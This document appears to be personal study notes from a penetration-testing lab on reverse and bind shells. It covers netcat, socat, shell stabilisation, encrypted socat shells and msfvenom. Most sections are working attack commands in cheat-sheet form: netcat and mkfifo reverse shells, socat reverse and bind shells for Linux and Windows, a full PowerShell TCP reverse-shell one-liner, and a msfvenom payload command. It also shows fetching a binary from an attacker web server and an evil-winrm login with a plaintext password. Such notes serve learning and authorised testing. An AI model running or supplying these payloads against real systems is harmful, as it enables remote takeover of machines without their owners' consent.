# Reverse vs Bind shells
1. Reverse shells
are when the target is forced to execute code that connects back to your computer. 

  - Example: `sudo nc -lvnp 443` to start listner on attacker's machine, and `nc <LOCAL-IP> <PORT> -e /bin/bash` to set a reverse shell on the target's machine.

2. Bind shells
are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way.

  - Example: `nc -lvnp <port> -e "cmd.exe"` through a evil-winrm `evil-winrm -i <localIP>-u Adminstrator -p 'Try4ackM3'` on the target machine to set a listening port, and `nc MACHINE_IP <port>` on attacker's machine to connect to the target.

The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.

## Shells can be either interactive or non-interactive
1. interactive: These allow you to interact with programs after executing them. For example, take the SSH login prompt. Examples include: Powershell, Bash, Zsh, sh, or any other standard CLI environment.

2. non-interactive: In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly, like whoami for example.

# Netcat shells stabilisation
### python
1. first step is `python -c 'import pty;pty.spawn("/bin/bash")'` which gets us a better featured bash shell. we might need to replace python with python2 or python3 as required.
2. second step is: `export TERM=xterm` -- this will give us access to term commands such as clear.
3. `stty raw -echo; fg` -- This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). then foregrounds the shell, thus completing the process.
    > Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

### rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. To use rlwrap, we invoke a slightly different listener: `rlwrap nc -lvnp <port>`.

This gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, cuz they are difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### Socat
1. we would first transfer a socat static compiled binary up to the target machine. How? set up a web server using `sudo python3 -m http.server 80` and download using `wget <LOCAL-IP>/socat -O /tmp/socat)` or on windows using `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`.

    > This technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.

> With any of the above techniques, it's useful to be able to change your terminal tty size if you want to use something like a text editor. use `stty -a` to show the current values and `stty cols <num>`/`stty rows <num>` to set a new value. 

# Socat
### reverse shells
1. `socat TCP-L:<port> -` is an equivalent for `nc -lvnp <port>`.
2. For Windows target we use `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` to connect back. The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output. while for Linux target we use `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

### bind shells
1. For linux target we use `socat TCP-L:<PORT> EXEC:"bash -li"`, while for windows we use `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`.
2. on attacker's machine we use `socat TCP:<TARGET-IP>:<TARGET-PORT> -` to connect to the listening target.

### Fully stable Linux tty reverse shell
This technique is one of its most useful applications. Here is the new listener syntax: (works only for linux targets) `socat TCP-L:<port> FILE:`tty`,raw,echo=0` which is equivalent to using the `Ctrl + Z`, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments:
- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.

  ### Example: (attacker< >target)
  ![image](https://github.com/user-attachments/assets/8ac883f6-5955-42d7-986b-c18692ab4bb3)

### Encrypted shells
Socat is capable of creating encrypted shells -- both bind and reverse. Suffice to say that any time TCP was used as part of a command, this should be replaced with OPENSSL when working with encrypted shells. 

Steps to use the feature:
1. We first need to generate a certificate. on our attacking machine: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`.
2. We then need to merge the two created files into a single .pem file: `cat shell.key shell.crt > shell.pem`
3. to set up a reverse shell listener `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
4. To connect back, we would use: `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
5. The same technique would apply for a bind shell:
  - Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
  - Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

    ### Example: (attacker< >target)
    ![image](https://github.com/user-attachments/assets/8992c65c-aead-4452-bb6a-aeea142ae7a9)

6. what if we want to use the tty technique with the encrypted shell? here is the command to use: `socat OPENSSL-LISTEN:53 FILE:`tty`,raw,echo=0,cert=shell.pem,verify=0 -`, and to connect back, we use `socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`.

# Common Shell Payloads
As normal we can start the listener with `nc -lvnp <PORT> -e /bin/bash` and connect with `nc <LOCAL-IP> <PORT> -e /bin/bash`, however on linux we need to use the following: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` and to connect: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.

One-liner PSH reverse shell, usually when tageting a windows server:
```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```


# msfvenom
The standard syntax for msfvenom is as follows: `msfvenom -p <PAYLOAD> <OPTIONS>`. For example, to generate a Windows x64 Reverse Shell in an exe format, we could use: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.


